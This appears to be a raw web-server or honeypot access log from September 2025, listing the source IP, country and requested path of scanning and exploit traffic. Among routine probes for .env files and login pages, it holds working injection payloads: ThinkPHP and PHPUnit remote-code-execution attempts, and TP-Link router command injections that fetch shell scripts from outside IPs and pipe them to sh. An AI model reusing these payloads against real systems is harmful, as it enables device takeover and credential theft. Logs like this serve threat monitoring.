"2025-09-14","91.196.152.107","France","HTTP","/favicon.ico"
"2025-09-14","198.98.53.110","United States","HTTP","/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-09-14","198.98.53.110","United States","HTTP","/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-09-14","198.98.53.110","United States","HTTP","/public/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-09-14","198.98.53.110","United States","HTTP","/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/\u003c?echo(md5(\"hi\"));?\u003e+/tmp/index1.php"
"2025-09-14","198.98.53.110","United States","HTTP","/index.php?lang=../../../../../../../../tmp/index1"
"2025-09-14","198.98.53.110","United States","HTTP","/containers/json"
"2025-09-14","170.64.134.120","Australia","HTTP","/aaa9"
"2025-09-14","170.64.134.120","Australia","HTTP","/aab8"
"2025-09-14","184.105.247.194","United States","HTTP","/favicon.ico"
"2025-09-14","184.105.247.194","United States","HTTP","/geoserver/web/"
"2025-09-14","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-09-14","68.183.89.246","India","HTTP","/favicon.ico"
"2025-09-14","216.180.246.158","United States","HTTP","/favicon.ico"
"2025-09-14","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-09-14","216.180.246.158","United States","HTTP","/manage/account/login"
"2025-09-14","216.180.246.158","United States","HTTP","/admin/index.html"
"2025-09-14","216.180.246.158","United States","HTTP","/index.html"
"2025-09-14","216.180.246.158","United States","HTTP","/+CSCOE+/logon.html"
"2025-09-14","216.180.246.158","United States","HTTP","/cgi-bin/login.cgi"
"2025-09-14","216.180.246.158","United States","HTTP","/login.htm"
"2025-09-14","216.180.246.158","United States","HTTP","/login.html"
"2025-09-14","216.180.246.158","United States","HTTP","/login.jsp"
"2025-09-14","216.180.246.158","United States","HTTP","/login"
"2025-09-14","216.180.246.158","United States","HTTP","/doc/index.html"
"2025-09-14","216.180.246.158","United States","HTTP","/remote/login"
"2025-09-14","216.180.246.158","United States","HTTP","/web/"
"2025-09-14","157.15.67.180","Indonesia","HTTP","/boaform/admin/formLogin?username=user\u0026psd=user"
"2025-09-14","37.60.141.156","Bulgaria","HTTP","/boaform/admin/formLogin"
"2025-09-14","167.94.146.56","United States","HTTP","/wiki"
"2025-09-14","162.216.149.228","United States","HTTP","/.well-known/security.txt"
"2025-09-14","165.154.238.72","United States","HTTP","/favicon.ico"
"2025-09-14","20.29.49.134","United States","HTTP","/hudson"
"2025-09-14","42.92.120.154","China","HTTP","/favicon.ico"
"2025-09-14","64.62.156.206","United States","HTTP","http://api.ipify.org/?format=json"
"2025-09-14","64.62.156.202","United States","HTTP","/geoserver/web/"
"2025-09-14","142.93.215.202","India","HTTP","/favicon.ico"
"2025-09-14","157.230.17.188","Germany","HTTP","/.env"
"2025-09-14","157.230.17.188","Germany","HTTP","/.git/config"
"2025-09-14","45.38.44.221","United States","HTTP","/login"
"2025-09-14","45.88.186.32","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60"
"2025-09-14","104.167.222.134","United States","HTTP","/.env"
"2025-09-14","20.65.194.42","United States","HTTP","/developmentserver/metadatauploader"
"2025-09-14","45.38.44.221","United States","HTTP","/login"
"2025-09-14","45.88.186.32","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60"
"2025-09-14","185.195.233.150","Sweden","HTTP","/.env"
"2025-09-14","147.182.246.203","United States","HTTP","/form.html"
"2025-09-14","147.182.246.203","United States","HTTP","/upl.php"
"2025-09-14","147.182.246.203","United States","HTTP","/t4"
"2025-09-14","147.182.246.203","United States","HTTP","/geoip/"
"2025-09-14","147.182.246.203","United States","HTTP","/favicon.ico"
"2025-09-14","147.182.246.203","United States","HTTP","/1.php"
"2025-09-14","147.182.246.203","United States","HTTP","/systembc/password.php"
"2025-09-14","147.182.246.203","United States","HTTP","/password.php"
"2025-09-14","94.102.49.155","The Netherlands","HTTP","/server-status"
"2025-09-14","80.82.77.202","The Netherlands","HTTP","/aaa9"
"2025-09-14","80.82.77.202","The Netherlands","HTTP","/aab9"
"2025-09-14","45.88.186.32","The Netherlands","HTTP","/GponForm/diag_Form?images/"
"2025-09-14","92.42.201.26","Slovenia","HTTP","http://ip-api.com/json/"
"2025-09-14","45.142.154.29","Hong Kong","HTTP","/version"
"2025-09-14","45.142.154.29","Hong Kong","HTTP","/v1"
"2025-09-14","45.88.186.32","The Netherlands","HTTP","/apply_sec.cgi"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/api/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/backend/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/admin/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env.example"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/?phpinfo=-1"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/docker.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/icon/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/local/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.docker/laravel/app/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/login/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/engine/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env_old"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/export/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env.staging"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/v3/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/libs/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/linux/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env.docker"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/api/v2/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/.env.prod.local"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/site/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/dependencies/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/sandbox/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/contact/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/build/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/bot/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/office/.env"
"2025-09-14","78.153.140.123","United Kingdom","HTTP","/repo/.env"
"2025-09-14","209.38.122.54","India","HTTP","/download/powershell/"
"2025-09-14","209.38.122.54","India","HTTP","/get.php"
"2025-09-14","138.197.64.193","United States","HTTP","/download/powershell/"
"2025-09-14","138.197.64.193","United States","HTTP","/get.php"
"2025-09-14","45.38.44.221","United States","HTTP","/goform/set_LimitClient_cfg"
"2025-09-14","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-09-14","176.65.149.162","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/telescope/requests"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/info.php"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/.git/config"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/server-status"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/config.json"
"2025-09-14","35.216.163.139","Switzerland","HTTP","/.env"
"2025-09-14","121.167.125.180","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-09-14","121.167.125.180","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-09-14","45.38.44.221","United States","HTTP","/goform/set_LimitClient_cfg"
"2025-09-14","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
